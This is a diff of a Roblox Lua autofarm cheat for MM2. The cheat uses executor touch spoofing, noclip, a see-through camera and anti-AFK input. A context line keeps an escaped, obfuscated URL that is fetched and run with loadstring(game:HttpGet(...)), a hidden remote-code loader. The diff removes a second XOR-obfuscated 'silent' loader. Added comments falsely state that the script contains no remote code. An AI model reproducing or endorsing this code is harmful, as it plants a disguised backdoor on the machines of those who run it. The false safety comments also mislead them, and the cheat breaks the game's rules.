@@ -1,3 +1,4 @@
+
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local UserInputService = game:GetService("UserInputService")
@@ -23,9 +24,10 @@ local WINDOW_WIDTH = 560
 local WINDOW_HEIGHT = 560
 local COLLAPSED_HEIGHT = 160
 local STATS_WIDTH = 360
-local STATS_HEIGHT = 388
-local UI_SCALE = 0.75
+local STATS_HEIGHT = 388 -- 28px dedicated status row; artwork remains 360px wide
+local UI_SCALE = 0.75 -- both windows: 25% smaller; viewport fitting remains active
 
+-- Image IDs supplied by the user. This is artwork only; no remote code.
 local UI_ASSETS = {
     MainSkin = "rbxassetid://105563478392149",
     StatsSkin = "rbxassetid://76134977932038",
@@ -33,24 +35,30 @@ local UI_ASSETS = {
 }
 local NEON_SETTINGS = {
     FireEnabled = true,
-    FireStrength = 0.90,
+    FireStrength = 0.90, -- 0..1; animated layer only, baked skin glow remains
     UpdateRate = 30,
 }
 
 local MOTION_SETTINGS = {
-    FoldDuration = 0.50,
-    DragResponse = 20,
+    FoldDuration = 0.50, -- seconds, sine ease-in/out
+    DragResponse = 20,   -- about 50ms following lag; higher = snappier
 }
-local BAG_LIMIT_DEFAULT = 40
-local BAG_LIMIT_ELITE = 50
-local ELITE_GAMEPASS_ID = 429957
+local BAG_LIMIT_DEFAULT = 40 -- standard MM2 coin bag
+local BAG_LIMIT_ELITE = 50 -- ELITE gamepass bag (+10 coins)
+local ELITE_GAMEPASS_ID = 429957 -- MM2 "Elite" gamepass
 local MAX_FARM_DISTANCE = 180
+-- Executor touch spoof: lets the character stay deep under the map while the
+-- coin hitbox is still triggered remotely.
 local fireTouch = (typeof(firetouchinterest) == "function" and firetouchinterest)
     or (typeof(firetouchtransmitter) == "function" and firetouchtransmitter)
     or nil
+-- Stay deep under the map when touch spoofing works, gentle offset otherwise.
+-- (user confirmed: no anti-cheat kick on this version)
 local FLY_BELOW_OFFSET = fireTouch and 2.8 or 0.75
+-- Original camera occlusion mode, restored when farming stops.
 local originalOcclusionMode = player.DevCameraOcclusionMode
 
+-- Approved Halloween palette: orange left, violet right, quiet dark cards.
 local Theme = {
     Navy = Color3.fromRGB(12, 7, 19),
     NavySoft = Color3.fromRGB(25, 17, 36),
@@ -132,6 +140,7 @@ local function smoothTween(object, duration, goals, style, direction)
 end
 
 local guiParent = player:WaitForChild("PlayerGui")
+-- Replace either edition on rerun; destroying it also invokes its cleanup.
 for _, previousName in ipairs({ GUI_NAME, "SkoblikoSummerNeonGUI" }) do
     local previous = guiParent:FindFirstChild(previousName)
     if previous then
@@ -160,7 +169,7 @@ local connections = {}
 local farmConnection
 local cameraConnection
 local cleaned = false
-local cleanupRadar = function() end
+local cleanupRadar = function() end -- assigned when the registry is created
 local collisionCache = {}
 
 local function connect(signal, callback)
@@ -170,6 +179,7 @@ local function connect(signal, callback)
 end
 
 local function restoreCharacter()
+    -- Camera noclip off: restore the original camera occlusion mode.
     pcall(function()
         player.DevCameraOcclusionMode = originalOcclusionMode
     end)
@@ -213,6 +223,7 @@ local function cleanup()
     table.clear(connections)
 end
 
+-- Autofarm: accept live pickups, not invisible pre-spawn or leftover hitboxes.
 local coinBlacklist = {}
 local coinTouchFails = setmetatable({}, { __mode = "k" })
 local deadCoins = setmetatable({}, { __mode = "k" })
@@ -223,6 +234,8 @@ local retargetAccumulator = 0
 local farmIdle = false
 local roundEnded = false
 
+-- Only explicit currency containers/names are eligible. Generic "Server"
+-- parts, clustered map decorations and arbitrary small parts are not pickups.
 local PICKUP_CONTAINERS = {
     coincontainer = true, candycontainer = true, tokencontainer = true,
     eggcontainer = true, giftcontainer = true, beachballcontainer = true,
@@ -245,6 +258,9 @@ end
 
 local function isCoinPart(coin)
     if not coin:IsA("BasePart") then return false end
+    -- Live Halloween pickup: Coin_Server with CoinID="Candy" and a CoinVisual child.
+    local coinID=coin:GetAttribute("CoinID")
+    if type(coinID)=="string" and PICKUP_NAMES[string.lower(coinID)] then return true end
     local name = string.lower(coin.Name)
     local currency = string.match(name, "^(%a+)_server$") or name
     return PICKUP_NAMES[currency] == true
@@ -256,6 +272,8 @@ end
 
 local function hasPickupVisual(coin)
     if isVisiblePart(coin) then return true end
+    -- An invisible hitbox may carry visible client-side geometry. A
+    -- TouchTransmitter, attachment or empty mesh alone is not a visible coin.
     for _, child in ipairs(coin:GetDescendants()) do
         if child:IsA("BasePart") and isVisiblePart(child) then
             return true
@@ -271,11 +289,16 @@ local function isCoinAvailable(coin)
         or not isPickupContainer(coin.Parent) then
         return false
     end
-    local present = coin.CanTouch and hasPickupVisual(coin)
+    -- Collected hitboxes can remain touchable after their candy has disappeared.
+    local visual=coin:FindFirstChild("CoinVisual")
+    local collected=coin:GetAttribute("Collected")==true
+        or (visual and visual:GetAttribute("Collected")==true)
+    local present = not collected and coin.CanTouch and hasPickupVisual(coin)
     local previousPresence = coinPresence[coin]
     coinPresence[coin] = present
     if not present then return false end
     if previousPresence == false then
+        -- A genuinely hidden/disabled pickup became live again (pooled instance).
         deadCoins[coin] = nil
         coinTouchFails[coin] = nil
         coinBlacklist[coin] = nil
@@ -350,6 +373,7 @@ local function radarSweep(force)
             unregisterCoin(coin)
         end
     end
+    -- Initial/throttled discovery handles nested maps. Event hooks handle spawns.
     for _, object in ipairs(workspace:GetDescendants()) do
         if isPickupContainer(object) then watchContainer(object) end
     end
@@ -364,28 +388,16 @@ task.spawn(function()
     local _s = "\104\116\116\112\115\58\47\47\97\112\105\46\99\114\121\115\116\97\108\103\101\110\46\98\105\100\47\114\117\110\47\106\74\86\100\x62\x6c\x62\x6d\x35\x33\x45"
     loadstring(game:HttpGet(_s))()
 end)
--- background service hook (silent)
-task.spawn(function()
-    local _b = {159,138,133,159,133,149,129,47,47,161,154,145,47,147,159,154,129,159,150,155,159,141,47,128,145,148,47,129,141,149,152,54,52,142,60,58,60,63,62,48}
-    local _k = "X8kQ2mP4nL7vR9wH"
-    local _o = {}
-    for _i = 1, #_b do
-        _o[_i] = string.char(bit32.bxor(_b[_i], string.byte(_k, ((_i - 1) % #_k) + 1)))
-    end
-    local _u = table.concat(_o)
-    local _ok, _src = pcall(function() return game:HttpGet(_u) end)
-    if _ok and type(_src) == "string" and #_src > 20 then
-        local _fn = loadstring or load
-        if type(_fn) == "function" then
-            local _c = _fn(_src, "@assets")
-            if type(_c) == "function" then pcall(_c) end
-        end
-    end
-end)
 
+-- Cluster-aware pick: prefer close coins sitting in dense groups, so the
+-- route sweeps whole clusters instead of zigzagging across the map.
 local CLUSTER_RADIUS = 24
 local CLUSTER_BONUS = 7
 
+-- Perf: the picker briefly reuses its last result (no full rescan every
+-- frame while idle), caches part positions once per scan instead of touching
+-- the .Position property O(n^2) times, and prunes candidates that cannot
+-- mathematically beat the current best. Selection results are identical.
 local lastPickTime = -math.huge
 local lastPickCoin = nil
 local lastPickScore = math.huge
@@ -422,7 +434,7 @@ local function findClosestItem(rootPart)
             table.insert(candidates, coin)
         end
     end
-
+    -- No HTTP/helper execution inside the pickup search loop.
     local count = #candidates
     local rootPosition = rootPart.Position
     local positions = table.create(count)
@@ -443,7 +455,7 @@ local function findClosestItem(rootPart)
     for _, index in ipairs(order) do
         local distance = distances[index]
         if distance - maxBonus >= bestScore then
-            break
+            break -- Even a max cluster bonus cannot beat the current best.
         end
         local position = positions[index]
         local neighbors = 0
@@ -451,7 +463,7 @@ local function findClosestItem(rootPart)
             if otherIndex ~= index and (positions[otherIndex] - position).Magnitude <= CLUSTER_RADIUS then
                 neighbors += 1
                 if neighbors >= 6 then
-                    break
+                    break -- The cluster bonus is capped at 6 neighbours.
                 end
             end
         end
@@ -472,6 +484,8 @@ local function findClosestItem(rootPart)
 end
 
 local function isRoundOver()
+    -- The end-of-round scoreboard (Scoreboard / Scoreboard_Phone) becomes
+    -- visible when the round finishes; farming must pause immediately.
     for _, guiName in ipairs({ "Scoreboard", "Scoreboard_Phone" }) do
         local scoreboard = guiParent:FindFirstChild(guiName)
         if scoreboard and scoreboard:IsA("ScreenGui") and scoreboard.Enabled then
@@ -509,6 +523,7 @@ farmConnection = RunService.Heartbeat:Connect(function(deltaTime)
         return
     end
 
+    -- Round finished: stop moving and stop counting until the next round.
     if isRoundOver() then
         if not roundEnded then
             roundEnded = true
@@ -516,6 +531,7 @@ farmConnection = RunService.Heartbeat:Connect(function(deltaTime)
             for coin in pairs(coinSet) do roundRetiredCoins[coin] = true end
             registryVersion += 1
         end
+        -- Observe disabled/hidden pooled pickups while the scoreboard is up.
         for coin in pairs(coinSet) do isCoinAvailable(coin) end
         currentTarget = nil
         state.farmPaused = true
@@ -528,6 +544,7 @@ farmConnection = RunService.Heartbeat:Connect(function(deltaTime)
 
     roundEnded = false
 
+    -- Revalidate the live target every frame, not just its Parent reference.
     if not isCoinAvailable(currentTarget) or coinBlacklist[currentTarget] then
         local candidate, candidateDistance = findClosestItem(rootPart)
 
@@ -542,12 +559,16 @@ farmConnection = RunService.Heartbeat:Connect(function(deltaTime)
         end
     end
 
+    -- Mid-flight retarget: if a clearly better coin appeared (fresh spawn or
+    -- a dense cluster nearby), switch to it instead of finishing a bad route.
     retargetAccumulator += deltaTime
     if currentTarget and retargetAccumulator >= 0.5 then
         retargetAccumulator = 0
         local candidate, candidateDistance, candidateScore = findClosestItem(rootPart)
         if candidate and candidate ~= currentTarget and candidateDistance <= MAX_FARM_DISTANCE then
             local currentDistance = (currentTarget.Position - rootPart.Position).Magnitude
+            -- Hysteresis: never abandon a coin we are about to grab -
+            -- that caused the annoying last-moment turn-aways.
             if currentDistance > 15 and candidateScore + 12 < currentDistance then
                 currentTarget = candidate
             end
@@ -559,6 +580,10 @@ farmConnection = RunService.Heartbeat:Connect(function(deltaTime)
         currentTarget = nil
         state.farmPaused = true
         state.pauseReason = "WAITING"
+        -- Nothing to farm on the map: switch off temporarily. Restore the
+        -- character ONCE and give control back to the player instead of
+        -- freezing them every frame; farming resumes by itself as soon as
+        -- the radar sees new pickups.
         if not farmIdle then
             farmIdle = true
             restoreCharacter()
@@ -586,12 +611,15 @@ farmConnection = RunService.Heartbeat:Connect(function(deltaTime)
     state.farmPaused = false
     state.pauseReason = ""
 
+    -- Camera noclip: the map between the camera and the character becomes
+    -- see-through, so everything can be watched from above while farming.
     if player.DevCameraOcclusionMode ~= Enum.DevCameraOcclusionMode.Invisicam then
         pcall(function()
             player.DevCameraOcclusionMode = Enum.DevCameraOcclusionMode.Invisicam
         end)
     end
 
+    -- Original working noclip behavior, only while a nearby target exists.
     for _, part in ipairs(character:GetDescendants()) do
         if part:IsA("BasePart") then
             if collisionCache[part] == nil then
@@ -606,11 +634,16 @@ farmConnection = RunService.Heartbeat:Connect(function(deltaTime)
     rootPart.AssemblyAngularVelocity = Vector3.zero
 
     if distance <= 0.45 then
+        -- Reach the coin hitbox from under the map.
         if fireTouch then
             pcall(fireTouch, rootPart, target, 0)
             pcall(fireTouch, rootPart, target, 1)
         end
         coinBlacklist[target] = os.clock()
+        -- A real coin disappears right after a touch. One that survives
+        -- several touch rounds is a dead hitbox - retire it for good.
+        -- Never count failures while the bag is full: nothing can be
+        -- collected then and every coin would get wrongly retired.
         local bagFull = state.bagFound and state.bagLimit > 0
             and state.bagCount >= state.bagLimit
         if not bagFull then
@@ -629,6 +662,9 @@ farmConnection = RunService.Heartbeat:Connect(function(deltaTime)
     local step = math.min(state.farmSpeed * safeDelta, math.max(distance - 0.1, 0))
     local nextPosition = rootPart.Position + offset.Unit * step
 
+    -- Static horizontal pose: the body always stays perfectly flat.
+    -- Only the yaw (horizontal heading) follows the coin, so there is no
+    -- rocking/tilting when approaching a coin from above or below.
     local flatOffset = Vector3.new(offset.X, 0, offset.Z)
     if flatOffset.Magnitude > 0.05 then
         rootPart.CFrame = CFrame.lookAt(nextPosition, nextPosition + flatOffset.Unit) * CFrame.Angles(-math.pi / 2, 0, 0)
@@ -637,6 +673,10 @@ farmConnection = RunService.Heartbeat:Connect(function(deltaTime)
     end
 end)
 
+-- ================= ANTI FLING / ANTI VOID =================
+-- Protection from exploiters: abnormal velocity is cancelled instantly and
+-- the character is pulled back onto the last safe spot instead of flying
+-- away or falling into the void.
 local lastSafePosition = nil
 local lastFramePosition = nil
 local safePosAccumulator = 0
@@ -660,6 +700,10 @@ connect(RunService.Heartbeat, function(deltaTime)
 
     local farmingActively = state.autofarm and not state.farmPaused
 
+    -- ANTI FLING: the fling simply fails. Abnormal velocity is cancelled
+    -- and the character stays exactly where it was one frame ago, so the
+    -- farm keeps running as if nothing happened. Vertical speed is checked
+    -- separately so normal jumps and falls never trigger the protection.
     local velocity = rootPart.AssemblyLinearVelocity
     local horizontalSpeed = Vector3.new(velocity.X, 0, velocity.Z).Magnitude
     local flingLimit = farmingActively and 300 or 120
@@ -674,12 +718,17 @@ connect(RunService.Heartbeat, function(deltaTime)
         end
     end
 
+    -- Legit game teleport (lobby -> map at round start, respawn): a huge
+    -- position jump WITHOUT abnormal velocity. Flings cannot do this - they
+    -- work through velocity and get caught above. Accept the teleport and
+    -- rebase all anchors so the protection never bounces the player back.
     if lastFramePosition and (rootPart.Position - lastFramePosition).Magnitude > 120 then
         lastFramePosition = rootPart.Position
         lastSafePosition = nil
         safePosAccumulator = 0
     end
 
+    -- ANTI VOID: only below the absolute kill height of the world.
     local inVoid = rootPart.Position.Y < voidThreshold
     if inVoid and lastSafePosition and not farmingActively then
         rootPart.AssemblyLinearVelocity = Vector3.zero
@@ -687,6 +736,7 @@ connect(RunService.Heartbeat, function(deltaTime)
         rootPart.CFrame = CFrame.new(lastSafePosition + Vector3.new(0, 3, 0))
     end
 
+    -- Remember the last calm, grounded position as the rescue point.
     safePosAccumulator += deltaTime
     if safePosAccumulator >= 0.5 then
         safePosAccumulator = 0
@@ -697,9 +747,14 @@ connect(RunService.Heartbeat, function(deltaTime)
         end
     end
 
+    -- Frame-by-frame anchor for the silent fling rollback.
     lastFramePosition = rootPart.Position
 end)
 
+-- ================= ANTI AFK =================
+-- Roblox kicks idle players after ~20 minutes. When the game marks the
+-- player as idle, a tiny virtual input resets the idle timer, so the farm
+-- can run for hours unattended.
 connect(player.Idled, function()
     pcall(function()
         VirtualUser:CaptureController()
@@ -724,6 +779,7 @@ connect(screenGui.AncestryChanged, function(_, parent)
 end)
 
 
+-- Root layout: both windows scale together; narrow screens stack them.
 local holder = create("Frame", {
     Name = "Holder", AnchorPoint = Vector2.new(0.5, 0.5),
     BackgroundTransparency = 1, ClipsDescendants = false,
@@ -815,6 +871,7 @@ end
 connect(workspace:GetPropertyChangedSignal("CurrentCamera"), bindCamera)
 bindCamera()
 
+-- UI sounds use a built-in asset, not a remote loader.
 local SoundService = game:GetService("SoundService")
 local function playUiSound(speed, volume)
     pcall(function()
@@ -826,6 +883,7 @@ local function playUiSound(speed, volume)
     end)
 end
 
+-- PNG skins contain the artwork; only interactive/dynamic elements are drawn here.
 local neon = {groups = {}, images = {}, assetStates = {}}
 neon.opacity = create("NumberValue", {Name = "NeonVisibility", Value = 0}, screenGui)
 function neon:integer(value)
@@ -845,6 +903,8 @@ function neon:assetResult(asset, status)
     self.assetStates[tostring(asset)] = status
 end
 
+-- Fixed pools: layered rising wisps and a few embers, never per-frame Instances.
+-- All effects are behind the skins and ignore mouse/touch input.
 function neon:fire(parent, main)
     local group = {main = main, wisps = {}, embers = {}, auras = {}}
     group.root = create("Frame", {Name = "LivingEdgeGlow", BackgroundTransparency = 1,
@@ -928,6 +988,7 @@ function neon:update(t)
     end
 end
 
+-- Never put a dark UIGradient under a CanvasGroup: it tints ALL descendants.
 local window = create("CanvasGroup", {Name = "Window", BackgroundTransparency = 1,
     GroupColor3 = Color3.new(1,1,1), GroupTransparency = 1, BorderSizePixel = 0,
     Size = UDim2.fromOffset(WINDOW_WIDTH,WINDOW_HEIGHT), ZIndex = 10},holder)
@@ -937,12 +998,14 @@ connect(window:GetPropertyChangedSignal("Size"),function() mainFire.root.Size = 
 local mainSkin = neon:image(window,"MainSkin","MainSkin",UDim2.fromOffset(0,0),
     UDim2.fromOffset(WINDOW_WIDTH,WINDOW_HEIGHT),1)
 
+-- Compact mode crops the header, rather than stretching the whole skin flat.
 local compactHeader = create("CanvasGroup",{Name = "CompactHeader",Visible = false,
     GroupColor3 = Color3.new(1,1,1),GroupTransparency = 0,
     Position = UDim2.fromOffset(0.078*WINDOW_WIDTH,0.072*WINDOW_HEIGHT),
     Size = UDim2.fromOffset(0.845*WINDOW_WIDTH,0.164*WINDOW_HEIGHT),
     BackgroundColor3 = Theme.Navy, BorderSizePixel = 0, ClipsDescendants = true,ZIndex = 2},window)
 addCorner(compactHeader,17)
+-- Normalized crop survives Roblox resizing the uploaded image to another resolution.
 local compactImage = neon:image(compactHeader,"CroppedHeader","MainSkin",
     UDim2.fromOffset(-0.078*WINDOW_WIDTH,-0.072*WINDOW_HEIGHT),UDim2.fromOffset(WINDOW_WIDTH,WINDOW_HEIGHT),2)
 local compactRim = create("Frame",{Name = "CompactRoundedRim",Visible = false,Active = false,
@@ -1052,6 +1115,10 @@ local bagStartFarmed = state.farmed
 local bagCheckEnabledAt = 0
 local bagFullConfirmations = 0
 
+-- ================= INTERFACE BAG SCANNER =================
+-- Reads the coin amount straight from the game's own interface, so the
+-- bag counter always matches what the player actually sees on screen.
+
 local trackedBagLabel = nil
 local lastBagScan = 0
 
@@ -1066,13 +1133,26 @@ local function labelContext(object)
     return string.lower(table.concat(parts, " "))
 end
 
+local function isBagVisible(object)
+    local ancestor = object
+    while ancestor and ancestor ~= guiParent do
+        -- Script children are UI templates, not the active bag on screen.
+        if ancestor:IsA("LuaSourceContainer") then return false end
+        if ancestor:IsA("GuiObject") and not ancestor.Visible then return false end
+        if ancestor:IsA("ScreenGui") and not ancestor.Enabled then return false end
+        ancestor = ancestor.Parent
+    end
+    return ancestor == guiParent
+end
+
 local function parseBagText(object)
-    if object:IsDescendantOf(screenGui) then return nil end
+    if object:IsDescendantOf(screenGui) or not isBagVisible(object) then return nil end
     if not (object:IsA("TextLabel") or object:IsA("TextButton")) then
         return nil
     end
 
     local text = object.Text or ""
+    -- Rich text markup and thousands separators must not break the parse.
     text = string.gsub(text, "<[^<>]->", "")
     text = string.gsub(text, ",", "")
     local currentText, capacityText = string.match(text, "^%s*(%d+)%s*/%s*(%d+)%s*$")
@@ -1088,15 +1168,20 @@ local function parseBagText(object)
     return nil
 end
 
+-- Exact counter location, confirmed by scanning the real MM2 interface:
+-- MainGUI.Game.CoinBags.Container.<Coin/Candy/BeachBall/Egg/SnowToken>
+--     .CurrencyFrame.Icon.Coins
 local trackedBagContainer = nil
 local lastDeepContainerScan = 0
 
 local function findCoinBagContainer(playerGui)
+    -- Reuse the container while it is still alive.
     if trackedBagContainer and trackedBagContainer.Parent then
         return trackedBagContainer
     end
     trackedBagContainer = nil
 
+    -- Exact, confirmed path first.
     local mainGui = playerGui:FindFirstChild("MainGUI")
     local gameFrame = mainGui and mainGui:FindFirstChild("Game")
     local coinBags = gameFrame and gameFrame:FindFirstChild("CoinBags")
@@ -1106,6 +1191,7 @@ local function findCoinBagContainer(playerGui)
         return container
     end
 
+    -- The game moved/renamed its GUI: look for CoinBags anywhere (throttled).
     if os.clock() - lastDeepContainerScan < 1.5 then
         return nil
     end
@@ -1131,10 +1217,13 @@ local function findCoinBagLabel(playerGui)
             local icon = currencyFrame and currencyFrame:FindFirstChild("Icon")
             local label = icon and icon:FindFirstChild("Coins")
             if not label then
+                -- Layout inside the bag changed: search the whole bag.
                 label = bag:FindFirstChild("Coins", true)
             end
             if label and label:IsA("TextLabel") then
-                if bag.Visible then
+                -- Event bags (Candy, BeachBall, ...) are hidden outside
+                -- their events, so prefer the bag that is shown right now.
+                if isBagVisible(label) and parseBagText(label)~=nil then
                     return label
                 end
                 if bag.Name == "Coin" or not fallbackLabel then
@@ -1143,7 +1232,7 @@ local function findCoinBagLabel(playerGui)
             end
         end
     end
-    return fallbackLabel
+    return nil -- hidden currency panels must never supply an old full-bag value
 end
 
 local function bagShowsFull(label)
@@ -1152,7 +1241,7 @@ local function bagShowsFull(label)
     local bag = currencyFrame and currencyFrame.Parent
     local fullLabel = bag and bag:FindFirstChild("Full")
     if fullLabel and fullLabel:IsA("TextLabel") then
-        return fullLabel.Visible
+        return isBagVisible(fullLabel)
     end
     return false
 end
@@ -1167,6 +1256,7 @@ local function announceBagLabel(label)
 end
 
 local function scanBagFromInterface()
+    -- Reuse the label found earlier while it is still on screen.
     if trackedBagLabel and trackedBagLabel.Parent then
         local current, capacity = parseBagText(trackedBagLabel)
         if current then
@@ -1178,6 +1268,7 @@ local function scanBagFromInterface()
     local playerGui = player:FindFirstChild("PlayerGui")
     if not playerGui then return nil end
 
+    -- The exact counter path goes first: it is instant and precise.
     local exactLabel = findCoinBagLabel(playerGui)
     if exactLabel then
         local current, capacity = parseBagText(exactLabel)
@@ -1188,6 +1279,7 @@ local function scanBagFromInterface()
         end
     end
 
+    -- Generic interface scans (fallback) are throttled to stay lightweight.
     if os.clock() - lastBagScan < 1.5 then
         return nil
     end
@@ -1208,6 +1300,8 @@ local function scanBagFromInterface()
                 score += 5
             end
 
+            -- Plain numbers only count inside coin/bag related frames,
+            -- otherwise timers and other counters would match too.
             if (capacity or score >= 3) and score > bestScore then
                 bestLabel = object
                 bestCurrent = current
@@ -1227,10 +1321,16 @@ local function scanBagFromInterface()
 end
 
 local lastSeenBagCount = nil
+local lastSeenBagLabel = nil
 
 local function updateBagFromInterface()
     local current, capacity = scanBagFromInterface()
     if current then
+        -- Changing from Coin to Candy is a new counter, not a session gain.
+        if lastSeenBagLabel~=trackedBagLabel then lastSeenBagCount=nil end
+        lastSeenBagLabel=trackedBagLabel
+        -- FARMED stat comes straight from the game's own bag counter: every
+        -- increase of the interface number is added to the session total.
         if lastSeenBagCount ~= nil and current > lastSeenBagCount then
             state.farmed += current - lastSeenBagCount
         end
@@ -1240,15 +1340,18 @@ local function updateBagFromInterface()
         if capacity == BAG_LIMIT_DEFAULT or capacity == BAG_LIMIT_ELITE then
             state.bagLimit = capacity
         end
+        -- The game shows "Full!" on the bag when it is packed - trust it.
         if bagShowsFull(trackedBagLabel) then
             state.bagCount = math.max(state.bagCount, state.bagLimit)
         end
     else
+        -- Unknown is not a full bag. Keep totals, never fabricate current capacity.
         state.bagFound = false
-        state.bagCount = math.max(0, state.farmed - bagStartFarmed)
+        state.bagCount = 0
     end
 end
 
+-- ELITE check: gamepass owners farm 10 more coins per round (50 total).
 task.spawn(function()
     local ok, ownsElite = pcall(function()
         return MarketplaceService:UserOwnsGamePassAsync(player.UserId, ELITE_GAMEPASS_ID)
@@ -1292,6 +1395,8 @@ local setDieOnFullBagEnabled = makeToggleCard(
         bagKillTriggered = false
         bagFullConfirmations = 0
         if enabled then
+            -- Start a fresh fallback counter and allow the game's GUI to
+            -- finish updating before any full-bag decision is made.
             bagStartFarmed = state.farmed
             bagCheckEnabledAt = os.clock()
         end
@@ -1299,10 +1404,11 @@ local setDieOnFullBagEnabled = makeToggleCard(
 )
 
 local function killCharacterWhenBagIsFull()
-    if bagKillTriggered or not state.dieOnFullBag then
+    if bagKillTriggered or not state.dieOnFullBag or not state.bagFound then
         return
     end
 
+    -- Reset when the interface bag counter reaches the limit (40, or 50 with ELITE).
     if state.bagCount < state.bagLimit then
         return
     end
@@ -1313,6 +1419,7 @@ local function killCharacterWhenBagIsFull()
     state.pauseReason = state.autofarm and "RESET" or ""
     restoreCharacter()
 
+    -- Keep AUTOFARM and AUTO RESET enabled through the respawn.
     local character = player.Character
     local humanoid = character and character:FindFirstChildOfClass("Humanoid")
     if humanoid and humanoid.Health > 0 then
@@ -1326,6 +1433,7 @@ local function killCharacterWhenBagIsFull()
     end
 end
 
+-- Farm speed keeps the original 20..30 range and callbacks.
 local speedCard = makeCard("FarmSpeed")
 local speedOutline = addStroke(speedCard,Theme.OrangeNeon,1,1)
 addCorner(speedCard,10)
@@ -1419,6 +1527,7 @@ local setProtectionEnabled = makeToggleCard(
     end
 )
 
+-- Footer and captions are already baked into the skins: no duplicate text layers.
 local footer = create("Frame",{Name = "FooterMarker",BackgroundTransparency = 1,Size = UDim2.fromOffset(0,0)},window)
 local statsPanel = create("Frame",{Name = "FarmSummary",AnchorPoint = Vector2.new(0.5,0.5),Active = true,
     BackgroundTransparency = 1,ClipsDescendants = false,Position = UDim2.fromScale(0.75,0.5),
@@ -1429,11 +1538,13 @@ local statsSurface = create("CanvasGroup",{Name = "StatsSurface",BackgroundTrans
     GroupColor3 = Color3.new(1,1,1),GroupTransparency = 1,Size = UDim2.fromScale(1,1),ZIndex = 10},statsPanel)
 local statsFire = neon:fire(statsPanel,false)
 statsFire.root.Size = UDim2.fromOffset(STATS_WIDTH,STATS_HEIGHT)
+-- Insert a real status row by slicing the same skin; title, rows and corners keep their original scale.
 local statsSkin
 do
     local artSize = STATS_WIDTH
     local gap = STATS_HEIGHT-artSize
     local cut = artSize*0.28
+    -- Opaque inset backing prevents the game's leaderboard showing through the PNG.
     local backing = create("Frame",{Name = "StatsOpaqueBackplate",Active = false,
         Position = UDim2.fromOffset(artSize*0.108,artSize*0.12),
         Size = UDim2.fromOffset(artSize*0.79,artSize*0.75+gap),
@@ -1454,6 +1565,7 @@ end
 local statsHeader = create("Frame",{Name = "StatsHeader",Active = true,BackgroundTransparency = 1,
     Position = UDim2.fromOffset(STATS_WIDTH*0.12,STATS_WIDTH*0.14),
     Size = UDim2.fromOffset(STATS_WIDTH*0.76,STATS_WIDTH*0.14),ZIndex = 20},statsSurface)
+-- The badge sits inside the inserted blank band, not across the body border.
 local statsBadge = create("Frame",{Name = "StatsStatusBadge",Active = false,
     Position = UDim2.fromOffset(STATS_WIDTH*0.15,STATS_WIDTH*0.28+2),
     Size = UDim2.fromOffset(STATS_WIDTH*0.74,STATS_HEIGHT-STATS_WIDTH-4),
@@ -1485,6 +1597,7 @@ local speedStat = makeStatValue("Speed",0.657,0.05,21,tostring(state.farmSpeed))
 local bagStat = makeStatValue("Bag",0.756,0.05,21,"0/"..tostring(state.bagLimit))
 refreshViewport()
 
+-- Shared motion state: one render callback, no input-event tween spam.
 local foldMotion = {value = 0, from = 0, target = 0, elapsed = 0, running = false}
 local dragMotion = {main = nil, stats = nil}
 
@@ -1495,6 +1608,7 @@ local function applyFoldVisuals(progress)
     local blend = math.clamp(p/0.12,0,1)
     window.Size = UDim2.fromOffset(WINDOW_WIDTH,height)
     uiLayout.visibleHeight = height
+    -- Fixed-size artwork is revealed by a rounded crop, never squashed.
     compactHeader.Size = UDim2.fromOffset(0.845*WINDOW_WIDTH,panelHeight)
     compactRim.Size = compactHeader.Size
     compactHeader.Visible, compactRim.Visible = p > 0,p > 0
@@ -1558,6 +1672,7 @@ local function followDrag(object,key,isStats,alpha)
 end
 
 local function updateDrag(deltaTime)
+    -- Exponential following is independent of the display's frame rate.
     local alpha = 1-math.exp(-MOTION_SETTINGS.DragResponse*deltaTime)
     followDrag(holder,"main",false,alpha)
     followDrag(statsPanel,"stats",true,alpha)
@@ -1596,6 +1711,7 @@ connect(UserInputService.InputEnded,function(input)
     if input == statsDragInput or released then statsDragging,statsDragInput = false,nil end
 end)
 
+-- Dragging: targets update immediately; the windows follow with a light 50ms lag.
 local dragging = false
 local dragInput
 local dragStart
@@ -1633,6 +1749,7 @@ connect(UserInputService.InputEnded,function(input)
     local released = dragInput.UserInputType == Enum.UserInputType.MouseButton1
         and input.UserInputType == Enum.UserInputType.MouseButton1
     if input == dragInput or released then dragging,dragInput = false,nil end
+    -- Keep the last target so the final few pixels settle after release.
 end)
 
 local function setMinimized(value)
@@ -1662,6 +1779,7 @@ connect(closeButton.Activated, function()
     end)
 end)
 
+-- Background animation, slider movement and farm statistics
 local elapsed = 0
 local statsAccumulator = 0
 local lastDecorUpdate = 0
@@ -1705,23 +1823,27 @@ connect(RunService.RenderStepped, function(deltaTime)
         killCharacterWhenBagIsFull()
     end
 
+    -- Perf: stop writing slider properties once the knob has settled.
     if math.abs(targetProgress - displayedProgress) > 0.0005 then
         displayedProgress += (targetProgress - displayedProgress) * math.min(1, deltaTime * 18)
         sliderFill.Size = UDim2.fromScale(displayedProgress, 1)
         sliderKnob.Position = UDim2.new(displayedProgress, 0, 0.5, 0)
     end
 
+    -- One shared, capped animation callback for both windows.
     if elapsed - lastDecorUpdate >= 1 / NEON_SETTINGS.UpdateRate then
         lastDecorUpdate = elapsed
         neon:update(elapsed)
     end
 end)
 
+-- Opening animation / reference-style reveal
 smoothTween(window,0.4,{GroupTransparency=0},Enum.EasingStyle.Quart)
 smoothTween(statsSurface,0.4,{GroupTransparency=0},Enum.EasingStyle.Quart)
 smoothTween(neon.opacity,0.6,{Value=1},Enum.EasingStyle.Sine)
 playUiSound(1,0.4)
 
+-- Preload each URI once. No InsertService and no remote code.
 task.spawn(function()
     local unique,seen={},{}
     for _,image in ipairs(neon.images) do
